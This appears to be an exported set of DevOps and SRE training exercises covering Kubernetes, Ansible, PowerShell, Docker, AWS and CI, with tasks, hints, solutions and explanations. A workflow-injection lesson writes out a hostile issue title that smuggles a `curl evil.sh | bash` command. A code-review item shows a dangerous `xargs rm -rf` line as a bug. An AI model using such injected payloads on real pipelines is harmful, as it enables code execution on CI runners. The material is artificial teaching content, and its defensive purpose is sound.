steps.task: Read the logs of the **crashed** container instance of pod `payments-api-6c9f7d8b5-2xkqp`.

steps.output:

steps.output: deployment.apps/payments-api rolled back

steps.hint: Same `rollout` family — ask for its status.
steps.output:
Waiting for deployment "payments-api" rollout to finish: 1 old replicas are pending termination...
deployment "payments-api" successfully rolled out

explanation: Use `logs --previous` to read the crash, `rollout undo` to restore the last good ReplicaSet, and `rollout status` to confirm. The real fix ships with the release: the new env var (from a ConfigMap or External Secret) must exist **before** the image that needs it. Also, `rollout restart` just restarts the broken version.

steps.hint: `lsof` can list open files with a link count below 1.
steps.output:
COMMAND   PID USER  FD  TYPE DEVICE    SIZE/OFF NLINK  NODE NAME
java     2211 app   45w  REG  259,1 40265318400     0  1311 /var/log/app/app.log.2026-11-01 (deleted)

steps.task: Free the 40 GB **without restarting** PID 2211 (it holds the file on fd 45).
steps.hint: Truncate the file through the process's file-descriptor path under /proc.

wrong.output: # that would take the payments app down — not allowed during business hours
rm: cannot remove: the file is already unlinked; space is held by the open descriptor

explanation: Disk space is freed only when every open descriptor closes. Someone `rm`'d a log that the JVM still writes to. Truncating through `/proc/<pid>/fd/<n>` frees it live. The permanent fix is logrotate with `copytruncate` (or a reopen signal), plus alerting on `node_filesystem_avail_bytes` trends.

title: Live: who can read secrets?
scenario: A PCI pre-audit asks: can the CI ServiceAccount `deployer` in namespace `ci` read Secrets in `prod`? It must NOT.

explore.output:
NAME       SECRETS   AGE
default    0         210d
deployer   0         210d

steps.task: Check whether `system:serviceaccount:ci:deployer` can `get secrets` in namespace `prod`.
steps.solution: kubectl auth can-i get secrets -n prod --as system:serviceaccount:ci:deployer
steps.hint: `kubectl auth can-i VERB RESOURCE -n NS --as USER`
steps.output: yes

steps.task: Find the binding that grants it (search role and cluster role bindings for `deployer`).
steps.solution: kubectl get rolebindings,clusterrolebindings -A -o wide | grep deployer
steps.hint: `kubectl get clusterrolebindings -o wide` shows subjects. Pipe it to grep.
steps.output: clusterrolebinding.rbac.authorization.k8s.io/deployer-admin   ClusterRole/cluster-admin   210d   ci/deployer

steps.task: Remove that over-privileged binding.
steps.output: clusterrolebinding.rbac.authorization.k8s.io "deployer-admin" deleted

steps.task: Re-run the check to prove access is gone.
steps.solution: kubectl auth can-i get secrets -n prod --as system:serviceaccount:ci:deployer
steps.output: no

explanation: `auth can-i --as` is the fastest RBAC audit, and `kubectl auth can-i --list --as ...` shows everything an identity can do. `cluster-admin` for CI is a top audit finding. Replace it with a namespaced Role scoped to the resources the deployer applies — or better, let Argo CD deploy and give CI no cluster access at all.

title: Manifest: production-ready Deployment
scenario: Complete the Deployment for `ledger` (port **8080**, health at **/healthz**). Pods must only get traffic when ready.
template:
apiVersion: {{api}}
kind: Deployment
metadata:
  name: ledger
spec:
  replicas: 3
  selector:
    matchLabels:
      app: ledger
  template:
    metadata:
      labels:
        app: {{label}}
    spec:
      containers:
        - name: ledger
          image: ghcr.io/acme/ledger@sha256:4b1f...
          ports:
            - containerPort: {{port}}
          {{probe}}:
            httpGet:
              path: /healthz
              port: 8080
          resources:
            requests: { cpu: 250m, memory: 512Mi }
            limits: { memory: 512Mi }
explanation: Deployments are `apps/v1`. The template labels must match `spec.selector.matchLabels`, or the API rejects the object. `readinessProbe` gates traffic, while a `livenessProbe` would restart the container. Setting memory request = limit gives predictable OOM behaviour, and many teams omit CPU limits to avoid throttling.

title: Manifest: default-deny + allow ingress controller
scenario: In namespace `payments`, deny all inbound traffic except from Pods in the `ingress-nginx` namespace on TCP 8080.
template:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress
  namespace: payments
spec:
  podSelector: {{selector}}
  policyTypes:
    - {{ptype}}
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              {{nslabel}}: ingress-nginx
      ports:
        - protocol: TCP
          port: 8080
explanation: An empty `podSelector: {}` selects every Pod in the namespace. Listing `Ingress` in policyTypes makes inbound default-deny, except what the rules allow. Every namespace automatically gets the immutable `kubernetes.io/metadata.name` label, which is safe to select on. Remember the CNI must enforce NetworkPolicy — VPC CNI needs network policy enabled.

title: Workflow: deploy to AWS with OIDC (no keys)
template:
name: deploy
on:
  push:
    branches: [main]
permissions:
  contents: read
  {{perm}}: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: prod
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          {{input}}: arn:aws:iam::111122223333:role/gha-deploy-prod
          aws-region: eu-central-1
      - run: aws sts get-caller-identity
explanation: `id-token: write` lets the job request a GitHub OIDC token, and `role-to-assume` exchanges it for short-lived STS credentials. Pair this with a trust policy whose `sub` is pinned to `repo:acme/app:environment:prod`, plus required reviewers on the `prod` environment.

title: HCL: S3 backend with native locking
scenario: Terraform ≥ 1.10. Store state in `acme-tfstate`, encrypted, with S3-native locking (no DynamoDB).
explanation: Since Terraform 1.10 the S3 backend can lock with a `.tflock` object (`use_lockfile = true`), and `dynamodb_table` is deprecated. Enable bucket versioning to recover from bad writes, and block public access.

title: Dockerfile: multi-stage, non-root
template:
FROM golang:1.23 {{as}} build
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -ldflags="-s -w" -o /out/api ./cmd/api

FROM gcr.io/distroless/static-debian12
COPY {{from}} /out/api /api
{{user}} nonroot:nonroot
ENTRYPOINT ["/api"]
explanation: Name the builder stage (`AS build`) and copy only the binary into the runtime image with `COPY --from=build`. Distroless images provide a `nonroot` user (UID 65532), and the exec-form ENTRYPOINT makes the binary PID 1 so signals arrive.

title: Manifest: HPA on CPU
scenario: Scale Deployment `api` between 3 and 20 replicas, targeting 65% average CPU utilisation.
template:
apiVersion: autoscaling/{{ver}}
kind: HorizontalPodAutoscaler
metadata:
  name: api
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: {{kind}}
    name: api
  minReplicas: 3
  maxReplicas: 20
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          {{field}}: 65
explanation: `autoscaling/v2` is the stable API (v2beta2 has been removed). Utilisation is relative to the container's CPU **request**. Add `behavior.scaleDown.stabilizationWindowSeconds` to avoid flapping.

title: IAM: least-privilege read of one prefix
scenario: The reporting role may only **read objects** under `s3://acme-reports/monthly/`.
explanation: Object actions target object ARNs (`bucket/prefix/*`). Listing would also need `s3:ListBucket` on the **bucket** ARN with an `s3:prefix` condition. Avoid `s3:*` and `Resource: *` — IAM Access Analyzer can generate least-privilege policies from CloudTrail activity.

title: Gateway API: route to a Service
scenario: Route `api.acme.io/v1/*` from Gateway `public-gw` (namespace `gateway`) to Service `api` port 8080.
template:
apiVersion: gateway.networking.k8s.io/v1
kind: {{kind}}
metadata:
  name: api
  namespace: shop
spec:
  {{parents}}:
    - name: public-gw
      namespace: gateway
  hostnames: ["api.acme.io"]
  rules:
    - matches:
        - path: { type: PathPrefix, value: /v1 }
      {{backends}}:
        - name: api
          port: 8080
explanation: HTTPRoute attaches to a Gateway through `parentRefs` and forwards to `backendRefs`. A cross-namespace attachment must also be allowed by the Gateway's `allowedRoutes` (and backends in other namespaces need a ReferenceGrant).

title: Code review: two findings
scenario: Your Checkov/Trivy job is down, so review by eye. Pick the **two** lines a PCI reviewer would block.
explanation: Line 9 opens SSH to the internet — use SSM Session Manager or a PAM bastion, or restrict to a VPN CIDR. Line 16 leaves card-data storage unencrypted, failing PCI DSS Req. 3. `password = var.db_password` is fine as long as the variable is `sensitive`; better still is `manage_master_user_password = true`, so the password lives in Secrets Manager.

title: Script injection in a workflow
scenario: An attacker opens an issue titled `x"; curl evil.sh | bash; echo "`. Which line executes it?
code:
name: triage
on:
  issues:
    types: [opened]
permissions:
  issues: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Label
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "New issue: ${{ github.event.issue.title }}"
          gh issue edit ${{ github.event.issue.number }} --add-label triage
explanation: `${{ }}` is expanded into the script *before* bash runs, so the title becomes code. Pass untrusted values through env vars (`env: TITLE: ${{ github.event.issue.title }}` → `echo "$TITLE"`). The issue number is numeric and safe. Linters such as zizmor and actionlint catch this.

title: Requests, limits and throttling
scenario: p99 latency of a Go API spikes every few seconds, yet the Pod's average CPU is only 40% of its 1-core limit.

context.title: cgroup
context.content:
$ kubectl exec api-7c9-xk2 -- cat /sys/fs/cgroup/cpu.stat
usage_usec 98120331
nr_periods 412882
nr_throttled 151204
throttled_usec 61202245

question: What's happening?
options: CFS quota throttling — bursts exceed the limit within 100ms periods; raise/remove the CPU limit and set GOMAXPROCS to match
The node is out of memory
The Pod has too many replicas
explanation: 37% of periods were throttled. Averages hide burstiness: a multi-threaded runtime can burn the whole quota in a few milliseconds and then stall until the next period. Common fixes are dropping CPU limits (keep requests), raising them, or setting `GOMAXPROCS` (e.g. automaxprocs) to the limit.

title: Cross-region egress via a proxy
scenario: ECS tasks in `me-central-1` must call a partner API that allow-lists only **eu-central-1** IPs. You route through a Squid proxy in eu-central-1.
question: Which pieces are required for a robust setup? (select all)
options: Squid instances in eu-central-1 with Elastic IPs (or behind NAT with EIPs) that the partner allow-lists
Private connectivity between regions (TGW inter-region peering or VPC peering) so tasks reach the proxy privately
`HTTPS_PROXY` (and `NO_PROXY` for AWS endpoints/internal) set in the task definition
Changing the ECS tasks' region in the task definition to eu-central-1
explanation: The source IP the partner sees is the proxy's egress IP, so it must be a stable EIP. Tasks need a private path to the proxy, and the env vars must route only partner traffic through it (`NO_PROXY` for `169.254.170.2`, `.amazonaws.com`, internal domains). The task definition's region can't be changed.

title: Histogram quantiles
scenario: You need the p95 latency per service across all Pods.
question: Which PromQL is correct for a Prometheus histogram?
explanation: Rate the buckets, sum them across Pods **keeping `le`**, then compute the quantile. You can't average pre-computed summary quantiles across instances.

title: EKS control-plane upgrade runbook
question: Order the steps for upgrading EKS 1.32 → 1.33 safely.
items: Check deprecated APIs and add-on compatibility (EKS upgrade insights, kubent/pluto)
Upgrade the control plane to 1.33
Upgrade managed add-ons (VPC CNI, CoreDNS, kube-proxy, EBS CSI) to 1.33-compatible versions
Roll the data plane: update Karpenter EC2NodeClass AMI / managed node groups, respecting PDBs
Verify workloads and SLO dashboards, then update IaC to the new versions
explanation: Removed APIs break first, so check them first. The control plane must lead (kubelets may lag behind the API server, but not run ahead of it). Add-ons follow the control plane, then nodes roll with PDBs protecting availability, and finally IaC is updated so there's no drift.

title: Leaked credential response
question: A long-lived IAM access key was found in a public repo. Order the response.
items: Deactivate the key immediately
Review CloudTrail for every action taken with that key
Remove any persistence the attacker created (new users, keys, roles, Lambda, EC2)
Rotate other secrets that might be exposed, and purge the key from Git history
Post-incident: move CI to OIDC, enable secret scanning push protection
explanation: Contain, investigate, eradicate, recover, then prevent. Assume automated abuse within minutes of the push.

title: Live: who is hammering nginx?
scenario: 5xx alerts on the public edge since 03:00. You're in `/var/log/nginx`. Fields in `access.log`: 1 = client IP, 7 = path, 9 = status. Answer with one-liners (awk, grep, sort, uniq, wc… any combination you like).

explore.output: access.log  access.log.1  error.log
412803 access.log

steps.task: Count the requests that returned any **5xx** status (field 9).
steps.hint: `awk '$9 ~ /^5/' access.log` prints only 5xx lines. Count them with `wc -l`.

steps.task: Show the **top 5** client IPs (field 1) by number of requests.
steps.solution: awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -5
steps.hint: Extract field 1, `sort | uniq -c` to count, `sort -rn` to rank, `head -5` to keep five.

wrong.output: # uniq only collapses ADJACENT duplicates — sort before uniq -c

steps.task: How many of `203.0.113.50`'s requests went to `/login`?
What is it? Type `answer A`, `answer B` or `answer C` — A) a CDN edge node · B) a credential-stuffing bot hitting /login · C) the load balancer's health check
steps.output: Correct — block or rate-limit it at the WAF/ingress (e.g. AWS WAF rate-based rule on /login) and alert on login 5xx/429 rates.

explanation: `awk` + `sort | uniq -c | sort -rn | head` is the on-call triage pipeline you'll type for the rest of your career. 99.7% of one IP's requests are `POST /login` from `python-requests`, which is credential stuffing. Rate-limit it at the edge, not in the app.

title: Live: the report script won't run
scenario: A Python script `report.py` with a pinned `requirements.txt` fails on a fresh Ubuntu 24.04 runner. Get it running the right way — in an isolated environment.

explore.output: README.md  report.py  requirements.txt
Python 3.12.3

steps.task: Run `report.py` to see the error.
steps.output:
Traceback (most recent call last):
  File "/home/dev/billing-report/report.py", line 3, in <module>
    import boto3
ModuleNotFoundError: No module named 'boto3'

steps.task: Create a virtual environment in `.venv`.
steps.hint: The standard library has a `venv` module: `python3 -m venv <dir>`.

wrong.output:
error: externally-managed-environment
× This environment is externally managed
╰─> To install Python packages system-wide, try apt install python3-xyz, or use a virtual environment.

steps.task: Activate it.
steps.output: (.venv) # the prompt now shows the active venv

steps.task: Install the pinned dependencies from `requirements.txt`.

wrong.output: Successfully installed boto3-1.35.90 ...   # unpinned — not the versions in requirements.txt (and pandas is still missing)

steps.output:
Collecting boto3==1.35.36 (from -r requirements.txt (line 1))
Collecting pandas==2.2.3 (from -r requirements.txt (line 2))
Successfully installed boto3-1.35.36 botocore-1.35.36 numpy-2.1.3 pandas-2.2.3 ...

steps.task: Run the report again.
steps.output:
Fetched 12,408 settlement rows from s3://acme-billing/2026-11/
Wrote report-2026-11.csv

explanation: Recent Debian and Ubuntu mark the system Python as externally managed (PEP 668), so a global `pip install` is refused, and `sudo pip` breaks OS tools. Use a venv per project (or `uv`), install from the **pinned** file, and in CI cache the venv or the wheel cache keyed on the hash of `requirements.txt`.

title: Live: roll an nginx change safely
scenario: You changed the nginx template in `site.yml`. Inventory is `inventory.ini` (group `web`: web1, web2). Verify, dry-run on one host, then apply to that host only.

explore.output: ansible.cfg  inventory.ini  roles/  site.yml

[web]
web1 ansible_host=10.0.4.11
web2 ansible_host=10.0.4.12

steps.task: Check connectivity to **all** hosts in the inventory with the ping module.
steps.hint: Ad-hoc: `ansible <pattern> -i <inventory> -m <module>`.
steps.output:
web1 | SUCCESS => { "changed": false, "ping": "pong" }
web2 | UNREACHABLE! => { "changed": false, "msg": "Failed to connect to the host via ssh: ssh: connect to host 10.0.4.12 port 22: Connection timed out", "unreachable": true }

steps.task: web2 is down for maintenance anyway. Check `site.yml` for syntax errors without running it.
steps.output: playbook: site.yml

steps.task: Dry-run against **only web1**, showing the file diffs.
steps.hint: Three flags: one to restrict hosts, one for check mode, one to show diffs.

wrong.output: # that targets every host in the play — the task says web1 only

steps.output:
TASK [nginx : render nginx.conf] ***********************************************
--- before: /etc/nginx/nginx.conf
+++ after: /home/ops/.ansible/tmp/nginx.conf.j2
@@ -31,7 +31,7 @@
-    keepalive_timeout 65;
+    keepalive_timeout 15;
changed: [web1]
RUNNING HANDLER [nginx : reload nginx] *****************************************
changed: [web1]
PLAY RECAP *********************************************************************
web1 : ok=6  changed=2  unreachable=0  failed=0  skipped=0

steps.task: Diff looks right. Apply it for real to **web1** only.

explanation: Ping proves reachability and auth, `--syntax-check` catches YAML and Jinja errors, and `--check --diff --limit` shows exactly what would change on one canary before you touch the fleet. In a real rollout you'd then use `serial:` in the play (or `--limit web2` later) to go host by host.

title: Live: IIS is down (PowerShell)
scenario: The legacy partner portal on `WIN-APP01` (IIS) returns nothing on 443 after the weekend's patching. Use PowerShell to find out why and bring it back. Cmdlets are case-insensitive here, as in real PowerShell.

explore.output:
Status   Name               DisplayName
------   ----               -----------
Stopped  W3SVC              World Wide Web Publishing Service
Stopped  WAS                Windows Process Activation Service
Running  WinRM              Windows Remote Management (WS-Manag...

Status   Name   DisplayName
------   ----   -----------
Stopped  WAS    Windows Process Activation Service

steps.task: Check the status of the IIS web service `W3SVC`.
steps.output:
Status   Name     DisplayName
------   ----     -----------
Stopped  W3SVC    World Wide Web Publishing Service

steps.task: Read the 5 newest events in the **System** log to see why it stopped.
steps.hint: `Get-WinEvent -LogName System -MaxEvents 5`
steps.output:
TimeCreated          Id LevelDisplayName Message
-----------          -- ---------------- -------
16/11/2026 06:02:11 7068 Error           The World Wide Web Publishing Service service depends on the Windows Process Activation Service service which failed to start because of the following error: The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
16/11/2026 06:02:10 7040 Information     The start type of the Windows Process Activation Service service was changed from auto start to disabled.

steps.task: Set `WAS` back to start automatically.
steps.hint: `Set-Service -Name <svc> -StartupType Automatic`

wrong.output: Start-Service : Service 'Windows Process Activation Service (WAS)' cannot be started due to the following error: Cannot start service WAS on computer '.'. (it's still disabled)

steps.task: Start `W3SVC` (it pulls in WAS as a dependency).
steps.output: WARNING: Waiting for service 'World Wide Web Publishing Service (W3SVC)' to start...

steps.task: Confirm port **443** answers on localhost.
steps.output:
ComputerName     : localhost
RemoteAddress    : ::1
RemotePort       : 443
TcpTestSucceeded : True

explanation: Event 7040 shows someone (or a hardening baseline) disabled WAS during patching, and event 7068 shows W3SVC failing on that dependency. `Set-Service -StartupType` then `Start-Service` fixes it, and `Test-NetConnection` is PowerShell's port check. Pin service start types in your configuration (DSC, Ansible `win_service`, GPO) so the next patch run can't undo them.

title: Live: why is this image 1.4 GB?
scenario: The Node.js frontend image `acme/web:2.0` is suddenly 1.4 GB and slow to roll out. Find the fat layer, fix the build context, rebuild as `acme/web:2.1`, and compare.

explore.output:
FROM node:22-alpine AS build
WORKDIR /app
COPY . .
RUN npm ci && npm run build
FROM nginx:1.27-alpine
COPY --from=build /app /usr/share/nginx/html
.dockerignore  Dockerfile  node_modules/  package.json  package-lock.json  public/  src/
1.1G    node_modules

steps.task: List the local `acme/web` images and their sizes.
steps.output:
REPOSITORY   TAG   IMAGE ID       CREATED        SIZE
acme/web     2.0   4e1f7a9b2c3d   20 hours ago   1.42GB

steps.task: Show the layer history of `acme/web:2.0`.
steps.output:
IMAGE          CREATED        CREATED BY                                      SIZE
4e1f7a9b2c3d   20 hours ago   COPY /app /usr/share/nginx/html # buildkit      1.37GB
<missing>      3 weeks ago    CMD ["nginx" "-g" "daemon off;"]                0B
<missing>      3 weeks ago    /bin/sh -c #(nop) ADD file:...                  48.6MB

steps.task: The whole `/app` (with `node_modules`) is copied into nginx. First check what the build context ignores.
steps.output: .git

steps.task: **Append** `node_modules` to `.dockerignore` (don't overwrite the file).

wrong.output: # single > overwrote the file — .git is no longer ignored. Use >>

steps.task: Rebuild as `acme/web:2.1`. (The Dockerfile's last COPY should also take only `/app/dist` — assume a teammate just pushed that fix.)
steps.hint: `docker build -t <name:tag> <context>` — the context is the current directory.
steps.output:
[+] Building 24.6s (12/12) FINISHED
 => [internal] load .dockerignore                                    0.0s
 => [internal] load build context                                    0.2s
 => => transferring context: 1.84MB                                  0.1s
 => exporting to image                                               0.3s
 => => naming to docker.io/acme/web:2.1                              0.0s

steps.task: Compare the sizes again.
steps.output:
REPOSITORY   TAG   IMAGE ID       CREATED          SIZE
acme/web     2.1   9b8c7d6e5f4a   10 seconds ago   52.3MB
acme/web     2.0   4e1f7a9b2c3d   20 hours ago     1.42GB

explanation: `docker history` points at the fat layer. A missing `.dockerignore` entry sends `node_modules` into the build context (slow builds), and copying the whole work dir into the runtime stage ships it. Ignore build junk, copy only the build output (`/app/dist`), and watch for `>` vs `>>` — overwriting `.dockerignore` silently starts shipping `.git`.

title: Request a GPU in a Pod
scenario: Schedule an inference Pod with one NVIDIA GPU onto tainted GPU nodes.
template:
spec:
  tolerations:
    - key: nvidia.com/gpu
      operator: Exists
      effect: {{effect}}
  containers:
    - name: vllm
      image: vllm/vllm-openai:v0.6.4
      resources:
        limits:
          {{res}}: 1
explanation: GPUs are requested as extended resources in `limits` (the request defaults to the same value). The toleration matches the `NoSchedule` taint that keeps general workloads off expensive GPU nodes.

title: Ship a new model version
question: Order a safe release of a new model version to production.
items: Register the trained model with lineage (data version, code commit, metrics)
Run the offline evaluation suite against the golden dataset and thresholds
Deploy in shadow mode and compare against the current model on live traffic
Canary to a small % with business and latency guardrail metrics
Promote to 100% and keep the previous version ready for rollback
explanation: Evidence first offline, then on live traffic without impact, then with limited impact. The same progressive-delivery ideas as app releases apply to models.

title: Template + handler
scenario: Render `nginx.conf.j2` and reload nginx only when the file actually changed.
template:
- name: Render nginx config
  ansible.builtin.{{mod}}:
    src: nginx.conf.j2
    dest: /etc/nginx/nginx.conf
    validate: nginx -t -c %s
  {{kw}}: reload nginx

# handlers/main.yml
- name: reload nginx
  ansible.builtin.service:
    name: nginx
    state: {{state}}
explanation: `template` renders Jinja2, and `validate` refuses to install a config that fails `nginx -t`. `notify` triggers the handler only on change, and `reloaded` keeps connections alive where `restarted` would drop them.

title: This rolling update takes the whole site down
scenario: Four web servers behind a load balancer. Which line makes this play cause downtime?
code:
- hosts: web
  become: true
  serial: "100%"
  tasks:
    - name: Deploy new build
      ansible.builtin.unarchive:
        src: "https://artifacts.acme.io/app-{{ version }}.tgz"
        dest: /srv/app
        remote_src: true
      notify: restart app
explanation: `serial: "100%"` updates and restarts every host at once. Use `serial: 1` or `"25%"` with `max_fail_percentage`, and drain each node from the load balancer in `pre_tasks` / `post_tasks`.

title: Introduce Ansible to a legacy fleet
question: Order a sensible path from hand-configured servers to Ansible-managed ones.
items: Build a dynamic inventory from cloud tags and test connectivity with `-m ping`
Write roles for one service and run them with `--check --diff` to see the drift
Fix differences on one canary host with `--limit`, then expand with `serial`
Run from CI with ansible-lint, pinned collections and vault/secret lookups
Schedule regular check-mode runs to detect drift
explanation: Inventory, observe, canary, automate, then keep watching. Check mode with diffs first shows how far reality has drifted before you change anything.

title: Review: two bugs in a deploy script
scenario: Pick the **two** lines that can cause real damage.
code:
#!/usr/bin/env bash
set -uo pipefail
RELEASE_DIR=/srv/app/releases
KEEP=5
cd $RELEASE_DIR
ls -t | tail -n +$((KEEP+1)) | xargs rm -rf
ln -sfn "$RELEASE_DIR/$1" /srv/app/current
systemctl reload app
explanation: Line 5: the script has no `-e`, so if `cd` fails (typo, unmounted disk) it carries on in the current directory, and line 6 deletes files there. Use `cd "$RELEASE_DIR" || exit 1`. Line 6: parsing `ls` output breaks on spaces and newlines, and unquoted input to `xargs rm -rf` makes that dangerous. Use `find ... -print0 | xargs -0`, or keep release names timestamped and sorted in an array.

title: A safe script skeleton
scenario: Fill in the strict-mode line and the cleanup trap.
explanation: Strict mode plus an EXIT trap means a failed download stops the script and always cleans up. `curl -f` turns HTTP errors into a non-zero exit.

title: S3 bucket policy: deny unencrypted transport
explanation: Deny any request where `aws:SecureTransport` is false, which enforces TLS. It's a common CIS and PCI control. Include both the bucket ARN and the object ARNs.

title: This SCP locks out the whole org
explanation: Denying `*` outside two regions also blocks global services whose calls go to us-east-1 (IAM, CloudFront, Route 53, Organizations, Support…). Use `NotAction` to exempt global services, as in AWS's region-deny example.

title: Only one prod deploy at a time
template:
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: prod
    {{key}}:
      group: deploy-prod
      cancel-in-progress: {{val}}
explanation: A concurrency group with `cancel-in-progress: false` queues prod deploys instead of overlapping or killing one mid-rollout.

title: Debug a red pipeline
question: A pipeline that was green yesterday fails today with no code change. Order the investigation.
items: Read the first error in the failing step's log (not the last line)
Diff the environment: runner image version, tool versions, dependency resolution, action versions
Re-run once to separate flaky from deterministic
Reproduce locally or in a debug run with the same inputs
Pin or fix the drifting input, and add a check so it can't drift silently again
explanation: 'No code change' usually means an input changed: unpinned dependencies, a runner image update or a moved action tag. Pinning and lock files make pipelines deterministic.

title: Compose healthcheck dependency
scenario: Start `api` only after Postgres is actually accepting connections.
template:
services:
  db:
    image: postgres:17
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      retries: 10
  api:
    image: acme/api:2.1
    depends_on:
      db:
        condition: {{cond}}
explanation: `depends_on` alone only waits for the container to start. `condition: service_healthy` waits for the healthcheck. Apps should still retry connections.

title: Why is every build a cache miss?
code:
FROM python:3.12-slim
ARG BUILD_DATE
LABEL build_date=$BUILD_DATE
WORKDIR /app
RUN echo "built at $BUILD_DATE" > /build.txt
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
explanation: A `RUN` that uses an ARG which changes every build (a timestamp) invalidates that layer and everything after it, including the pip install. Move build metadata to the end, or into labels only.

title: Enforce LF for shell scripts
explanation: Per-path line endings stop the `bash\r` bug on Linux and keep PowerShell scripts in CRLF for Windows tooling. `binary` stops Git from diffing or converting images.

title: Bisect a regression
question: Order a bisect to find which of 300 commits broke checkout.
items: `git bisect start`
`git bisect bad` (current HEAD is broken)
`git bisect good v3.3.0` (last known good)
`git bisect run ./scripts/test-checkout.sh` (exit 0 = good, non-zero = bad)
Note the first bad commit, then `git bisect reset`
explanation: About 8–9 automated steps find one commit among 300. `exit 125` in the script tells bisect to skip untestable commits.

title: This pre-commit config doesn't stop secrets
code:
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.21.2
    hooks:
      - id: gitleaks
        stages: [manual]
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: trailing-whitespace
explanation: `stages: [manual]` means gitleaks only runs when someone invokes it explicitly. Remove it, so it runs at pre-commit, and run gitleaks in CI too, since hooks can be skipped.

title: Don't fight the HPA
template:
spec:
  ignoreDifferences:
    - group: apps
      kind: {{kind}}
      {{ptr}}:
        - /spec/replicas
explanation: `ignoreDifferences` with jsonPointers stops Argo CD from reporting or reverting the replica count the HPA manages. Add `RespectIgnoreDifferences=true` to syncOptions so syncs don't overwrite it either.

title: Bootstrap a new cluster with GitOps
question: Order the bootstrap of a brand-new EKS cluster managed by Argo CD.
items: Terraform creates the cluster, node pools and IAM (IRSA/Pod Identity) for add-ons
Install Argo CD (Helm/Terraform) with SSO config
Register the cluster and apply one root 'app of apps' / ApplicationSet
Argo syncs platform add-ons first (sync waves: CRDs, cert-manager, ESO, ingress)
Then team applications sync onto the ready platform
explanation: Terraform builds the infrastructure, then one root object hands over to GitOps. Sync waves keep CRDs and platform services ahead of the workloads that need them.

title: Pod Security Admission: enforce restricted
template:
apiVersion: v1
kind: Namespace
metadata:
  name: payments
  labels:
    pod-security.kubernetes.io/{{mode}}: {{level}}
    pod-security.kubernetes.io/warn: restricted
explanation: Namespace labels configure the built-in Pod Security Admission. `enforce` rejects non-compliant Pods, while `warn` and `audit` only report. Roll out with warn or audit first.

title: Protect the audit bucket
explanation: With `prevent_destroy`, any plan that would destroy the resource becomes an error. Add S3 Object Lock or a versioning MFA delete for protection outside Terraform too.

title: This inference Deployment wastes GPUs
code:
spec:
  replicas: 4
  template:
    spec:
      containers:
        - name: embed
          image: acme/embedder:1.3
          resources:
            limits:
              nvidia.com/gpu: 1
              memory: 4Gi
      nodeSelector:
        node.kubernetes.io/instance-type: p4d.24xlarge
explanation: A small embedding model pinned to `p4d.24xlarge` (8× A100) claims whole nodes for one GPU each. Use a right-sized GPU family (g6, inf2 or L4-class) via Karpenter requirements, or share GPUs with MIG or time-slicing.

title: KEDA: scale inference on queue depth
explanation: A KEDA `ScaledObject` scales the Deployment on SQS backlog — about 5 messages per replica here — and down to zero when idle. Give KEDA's operator IAM access via Pod Identity or IRSA.

title: Debug a slow LLM endpoint
question: p95 time-to-first-token jumped from 400 ms to 3 s. Order the investigation.
items: Check the queue depth / waiting requests metric (are requests queuing?)
Check GPU utilisation and KV-cache usage (saturated or evicting?)
Check prompt token counts — did a change add huge context?
Scale replicas or cap concurrency/context length as mitigation
Fix the root cause (prompt size, routing to a smaller model, capacity plan)
explanation: TTFT is mostly queueing plus prefill time, and prefill scales with prompt length. Rule out queueing and saturation first, then look for prompt bloat.

title: Wait until the service is healthy
template:
- name: Wait for /health
  ansible.builtin.uri:
    url: "http://{{ inventory_hostname }}:8080/health"
    status_code: 200
  register: health
  {{loop}}: health.status == 200
  retries: 20
  {{d}}: 3
explanation: `until`, `retries` and `delay` poll until the condition holds, then fail the host if it never does. Combined with `max_fail_percentage`, that's a safe rollout gate.

title: Wait for every background job
template:
pids=()
for r in eu-central-1 me-central-1; do ./deploy.sh "$r" & pids+=({{p}}); done
fail=0
for pid in "${pids[@]}"; do {{w}} "$pid" || fail=1; done
exit "$fail"
explanation: `$!` is the PID of the last background job, and `wait <pid>` returns its exit status. Collecting them makes one failed region fail the whole script.

title: Write a production-safe script
question: Order the skeleton of a safe ops script.
items: `#!/usr/bin/env bash` and `set -euo pipefail`
Parse and validate arguments (usage on error, `${1:?}`)
Create temp resources with `mktemp` and set `trap cleanup EXIT`
Do the work with quoted expansions and explicit error handling
Exit with a meaningful status and log what happened
explanation: Strict mode first, inputs validated before anything runs, cleanup guaranteed, then the real work. Run ShellCheck in CI.

title: systemd unit hardening
template:
[Service]
User=app
ExecStart=/opt/app/bin/app
Restart=on-failure
{{a}}=true
ProtectSystem={{b}}
PrivateTmp=true
LimitNOFILE=65535
explanation: `NoNewPrivileges` blocks setuid escalation, and `ProtectSystem=strict` makes the filesystem read-only except paths in `ReadWritePaths=`. `systemd-analyze security app` scores a unit's hardening.

title: This logrotate config loses logs
code:
/var/log/app/*.log {
    daily
    rotate 7
    compress
    missingok
    create 0640 app app
}
explanation: `create` renames the file and makes a new one, but the app keeps writing to the old, renamed file descriptor. Add a `postrotate` that signals the app to reopen its logs, or use `copytruncate` (which can lose a few lines).

title: Grow a full EBS-backed filesystem online
question: Order growing an XFS root filesystem on EC2 without downtime.
items: Modify the EBS volume size (console/CLI) and wait for 'optimizing'
`lsblk` to confirm the new disk size
`growpart /dev/nvme0n1 1` to extend the partition
`xfs_growfs /` (ext4 would be `resize2fs`)
`df -h` to confirm
explanation: EBS resizes are online. The partition and then the filesystem need growing. Snapshot first if the data matters.

title: Why is SSH from the bastion blocked?
code:
# NACL inbound (private subnet)
100  ALLOW  TCP  22           10.0.1.0/24
